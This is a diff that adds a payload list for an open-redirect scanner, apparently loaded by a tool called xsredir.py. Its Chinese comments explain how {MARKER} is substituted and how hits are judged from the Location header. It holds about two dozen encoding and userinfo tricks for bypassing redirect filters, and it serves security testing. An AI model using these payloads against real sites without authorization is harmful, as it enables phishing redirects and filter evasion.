@@ -1,0 +1,27 @@
+# 开放重定向 payload 库（主来源：UrlRedirectScan V1.2.0 内置表提取 + 经典补充）
+# 使用：xsredir.py 默认加载本文件；每行一个 payload，{MARKER} 替换为检测标记域名
+# 判定：响应 Location 头含标记 = 跳转实锤；Location 为同域/子域 = 常见误报（工具自动过滤）
+https://www.{MARKER}
+https://www.{MARKER}%23
+https://www.{MARKER}%3F
+https://www.{MARKER}%5C%2E
+https://www.{MARKER}%5C%40
+https://www.{MARKER}%E3%80%82
+https://www.{MARKER}%E3%80%82%40
+https://www.{MARKER}:80%40www.google.com
+https://%40www.{MARKER}
+//www.{MARKER}
+///www.{MARKER}
+https:/\//www.{MARKER}
+\/\/www.{MARKER}
+https://%2f%2fwww.{MARKER}
+https://%2f%2e%2f%2e%2f%2fwww.{MARKER}
+https://www.google.com@www.{MARKER}
+https://www.{MARKER}.google.com
+https://www.google.com。www.{MARKER}
+%2f%2fwww.{MARKER}
+%2e%2e%2f%2fwww.{MARKER}
+..%2f%2fwww.{MARKER}
+/%2f%2fwww.{MARKER}
+//%09/www.{MARKER}
+https://www.{MARKER}%252f%252f
